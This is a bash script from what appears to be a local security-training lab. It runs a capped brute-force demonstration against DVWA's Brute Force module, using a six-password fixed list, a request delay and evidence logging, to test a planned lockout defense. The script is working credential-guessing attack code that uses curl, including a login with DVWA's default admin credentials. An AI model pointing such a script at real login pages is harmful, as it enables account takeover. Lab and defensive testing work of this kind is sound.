#!/bin/bash
# dvwa-bruteforce.sh
# Bounded brute-force demonstration against the café web app (US-10, issue #109).
#
# Run from Kali on the undefended build:
#   docker exec swagpc-kali bash /scripts/attack/dvwa-bruteforce.sh
# Re-run it after the throttling/lockout defense to confirm the threshold is
# enforced (see defense/application-security/dvwa-bruteforce-defense.md).
#
# IMPORTANT — what this targets:
#   DVWA's Brute Force *module* at /vulnerabilities/brute/ (a simulated staff
#   login), NOT DVWA's own /login.php admin login. The script authenticates to
#   DVWA once to get a session, sets security=low, then guesses passwords for a
#   synthetic staff account on the module.
#
# Scope: local SwagPc Café lab only. Uses a small fixed candidate list that
# includes the known lab password, so success is provable. Lab credentials only.

set -u

TARGET="${TARGET:-http://192.168.20.10}"
MODULE="$TARGET/vulnerabilities/brute/"
JAR="/tmp/dvwa-brute-cookies-$$.txt"
EVIDENCE_DIR="${EVIDENCE_DIR:-/evidence/attack}"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RESULT_FILE="$EVIDENCE_DIR/bruteforce-$TIMESTAMP.txt"

# ── Bounded test parameters (edit here; kept small and fixed on purpose) ──────
STAFF_USER="${STAFF_USER:-admin}"          # synthetic staff account on the module
MAX_ATTEMPTS="${MAX_ATTEMPTS:-6}"          # hard cap on guesses
REQUEST_DELAY="${REQUEST_DELAY:-1}"        # seconds between attempts (request rate)
# Fixed candidate list. The known lab password ("password") is included so the
# undefended baseline provably succeeds; the rest are wrong on purpose.
CANDIDATES=("letmein" "admin123" "coffee123" "wrongpass" "password" "espresso")

mkdir -p "$EVIDENCE_DIR" 2>/dev/null || true
cleanup() { rm -f "$JAR"; }
trap cleanup EXIT

get_user_token() { printf '%s' "$1" | grep -o "user_token' value='[^']*" | sed "s/.*value='//"; }

log() { echo "$1" | tee -a "$RESULT_FILE"; }

# ── Establish a DVWA session and force security=low (undefended baseline) ─────
establish_session() {
    local login_page token sec_page sec_token
    login_page=$(curl -fsS -c "$JAR" -b "$JAR" "$TARGET/login.php") || return 1
    token=$(get_user_token "$login_page")
    [ -n "$token" ] || { echo "[ERROR] no login token" >&2; return 1; }
    curl -fsS -o /dev/null -c "$JAR" -b "$JAR" \
        --data-urlencode "username=admin" --data-urlencode "password=password" \
        --data-urlencode "Login=Login" --data-urlencode "user_token=$token" \
        "$TARGET/login.php" || return 1

    sec_page=$(curl -fsS -c "$JAR" -b "$JAR" "$TARGET/security.php") || return 1
    sec_token=$(get_user_token "$sec_page")
    curl -fsS -o /dev/null -c "$JAR" -b "$JAR" \
        --data-urlencode "security=low" --data-urlencode "seclev_submit=Submit" \
        --data-urlencode "user_token=$sec_token" \
        "$TARGET/security.php" || return 1
}

log "============================================="
log " SwagPc Café — DVWA Brute-Force Demonstration"
log " Timestamp:      $TIMESTAMP"
log " Target module:  $MODULE"
log " Staff account:  $STAFF_USER"
log " Max attempts:   $MAX_ATTEMPTS   Request delay: ${REQUEST_DELAY}s"
log "============================================="

if ! establish_session; then
    log "[ERROR] Could not establish a DVWA session. Check the lab is up and the DB is initialized."
    exit 1
fi
log "[*] DVWA session established (security=low)."
log ""

attempt=0
success=0
fail=0
errors=0
SECONDS=0   # bash builtin stopwatch

for pw in "${CANDIDATES[@]}"; do
    attempt=$((attempt + 1))
    if [ "$attempt" -gt "$MAX_ATTEMPTS" ]; then
        log "[*] Reached MAX_ATTEMPTS ($MAX_ATTEMPTS); stopping."
        attempt=$((attempt - 1))
        break
    fi

    resp=$(curl -s -w $'\n__HTTP__%{http_code}' -b "$JAR" -c "$JAR" -G "$MODULE" \
        --data-urlencode "username=$STAFF_USER" \
        --data-urlencode "password=$pw" \
        --data-urlencode "Login=Login" 2>/dev/null)
    code=$(printf '%s' "$resp" | sed -n 's/.*__HTTP__\([0-9][0-9]*\)$/\1/p')
    body=$(printf '%s' "$resp" | sed 's/__HTTP__[0-9]*$//')

    if [ -z "$code" ] || [ "$code" -ge 500 ] 2>/dev/null || [ -z "$body" ]; then
        log "  attempt $attempt  pw='$pw'  -> ERROR (http=${code:-none}) [infrastructure, not a login result]"
        errors=$((errors + 1))
    elif printf '%s' "$body" | grep -qi "Welcome to the password protected area"; then
        log "  attempt $attempt  pw='$pw'  -> SUCCESS (authenticated) http=$code"
        success=$((success + 1))
        log "[*] Credentials accepted for '$STAFF_USER' after $attempt attempt(s)."
        break
    elif printf '%s' "$body" | grep -qi "password incorrect"; then
        log "  attempt $attempt  pw='$pw'  -> fail (rejected) http=$code"
        fail=$((fail + 1))
    else
        log "  attempt $attempt  pw='$pw'  -> fail/unknown (no success marker) http=$code"
        fail=$((fail + 1))
    fi

    sleep "$REQUEST_DELAY"
done

elapsed=$SECONDS
log ""
log "--- Summary ---"
log "Attempts made:        $attempt"
log "Authenticated success: $success"
log "Rejected guesses:      $fail"
log "Infrastructure errors: $errors"
log "Elapsed time:          ${elapsed}s"
if [ "$success" -gt 0 ]; then
    log "RESULT: VULNERABLE — brute force guessed a valid staff password (undefended baseline)."
else
    log "RESULT: guessing did NOT succeed within $attempt attempts."
    log "        (Confirm this is a real defense, not a CSRF/endpoint/firewall error above.)"
fi
log "Evidence saved to: $RESULT_FILE"
